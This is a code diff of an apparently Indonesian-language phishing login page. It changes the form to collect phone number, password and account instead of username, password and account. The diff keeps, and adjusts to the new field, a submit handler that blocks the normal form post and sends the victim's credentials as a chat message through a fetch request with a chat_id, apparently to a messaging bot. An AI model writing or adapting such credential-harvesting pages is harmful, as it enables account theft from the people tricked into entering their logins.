@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html>
 <head>
 	<title>Login Form</title>
@@ -54,8 +53,8 @@
 	<div class="login-form">
 		<h2>Login ke akun Anda</h2>
 		<form id="login-form" action="/login" method="post">
-			<label for="username">Username:</label><br>
-			<input type="text" id="username" name="username" required><br>
+			<label for="phone">Phone Number:</label><br>
+			<input type="text" id="phone" name="phone" required><br>
 			<label for="password">Password:</label><br>
 			<input type="password" id="password" name="password" required><br>
 			<label for="account">Account:</label><br>
@@ -77,7 +76,7 @@
 			document.getElementById('login-form').addEventListener('submit', (e) => {
 				e.preventDefault();
 
-				const username = e.target.username.value;
+				const phone = e.target.phone.value;
 				const password = e.target.password.value;
 				const account = e.target.account.value;
 
@@ -95,7 +94,7 @@
 						headers: { 'Content-Type': 'application/json' },
 						body: JSON.stringify({
 							chat_id: chatId,
-							text: `Login attempt:\nUsername: ${username}\nPassword: ${password}\nAccount: ${account}`
+							text: `Login attempt:\nPhone Number: ${phone}\nPassword: ${password}\nAccount: ${account}`
 						})
 					})
 					.then((response) => response.json())
